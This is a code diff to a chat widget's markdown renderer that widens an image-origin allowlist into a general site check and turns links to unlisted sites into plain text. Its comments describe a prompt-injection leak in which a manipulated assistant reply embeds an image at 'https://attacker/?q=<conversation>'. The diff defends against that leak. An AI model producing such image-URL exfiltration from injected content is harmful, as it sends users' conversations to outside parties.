@@ -9,15 +9,17 @@ DOMPurify.addHook('afterSanitizeAttributes', (node) => {
   }
 });
 
-/** Decides whether an image URL may be loaded; see imageGate(). */
+/** Says whether a web address is allowed; see originGate(). */
 export type ImageGate = (src: string) => boolean;
+export type LinkGate = (href: string) => boolean;
 
 /**
- * Images may load from the host page's own origin and the listed ones only.
- * Anything else is how a prompt-injected reply would leak data: the browser
- * fetches `https://attacker/?q=<conversation>` the moment the image renders.
+ * Allows web addresses on the page's own site and on the listed sites only.
+ *
+ * The page's own site comes from the browser, so it is always right for whichever
+ * deployment the chat box runs in; only extra sites need to be listed in the product's settings.
  */
-export function imageGate(allowedOrigins: readonly string[], base: string = document.baseURI): ImageGate {
+export function originGate(allowedOrigins: readonly string[], base: string = document.baseURI): ImageGate {
   const allowed = new Set(allowedOrigins.map((o) => o.replace(/\/+$/, '').toLowerCase()));
   allowed.add(new URL(base).origin.toLowerCase());
   return (src: string) => {
@@ -31,14 +33,24 @@ export function imageGate(allowedOrigins: readonly string[], base: string = docu
 }
 
 /**
- * Renders an assistant reply (markdown) to HTML that is safe to insert.
- *
- * The text comes from a language model, so it is untrusted: DOMPurify strips
- * scripts, event handlers and javascript: URLs, and images outside `gate` become
- * plain links. Never skip the sanitize step - unlike the old Angular widget,
- * nothing else in this component does it.
+ * Images may only load from allowed sites. Loading one from anywhere else is how a reply
+ * tricked by a malicious document could leak data: the browser fetches
+ * `https://attacker/?q=<conversation>` the moment the image appears.
  */
-export function renderMarkdown(text: string, gate: ImageGate = () => false): string {
+export const imageGate = originGate;
+
+/**
+ * Turns an assistant reply (markdown) into HTML that is safe to show.
+ *
+ * The text comes from a language model, so it cannot be trusted:
+ *   - DOMPurify removes scripts, event handlers and javascript: links
+ *   - images load only from sites `gate` allows
+ *   - links stay clickable only for sites `links` allows. Any other link is shown as
+ *     plain text with its real address next to it, so a look-alike link cannot fool the
+ *     user, who can still copy it if they want.
+ * By default only the page's own site is allowed for links.
+ */
+export function renderMarkdown(text: string, gate: ImageGate = () => false, links: LinkGate = originGate([])): string {
   if (!text) {
     return '';
   }
@@ -54,7 +66,8 @@ export function renderMarkdown(text: string, gate: ImageGate = () => false): str
       img.setAttribute('referrerpolicy', 'no-referrer');
       return;
     }
-    // Not loaded, but not hidden either: the person can still choose to open it.
+    // Not loaded, but not hidden either: it becomes a link, which the link check below
+    // then keeps clickable or turns into text, like any other link.
     const link = document.createElement('a');
     link.textContent = img.getAttribute('alt') || src;
     if (/^https?:/i.test(src)) {
@@ -63,6 +76,18 @@ export function renderMarkdown(text: string, gate: ImageGate = () => false): str
       link.rel = 'noopener noreferrer';
     }
     img.replaceWith(link);
+  });
+
+  template.content.querySelectorAll('a').forEach((a) => {
+    const href = a.getAttribute('href') || '';
+    if (href && links(href)) {
+      return;
+    }
+    const text = (a.textContent || '').trim();
+    const plain = document.createElement('span');
+    plain.className = 'blocked-link';
+    plain.textContent = href && text !== href ? (text ? text + ' (' + href + ')' : href) : text;
+    a.replaceWith(plain);
   });
   return template.innerHTML;
 }
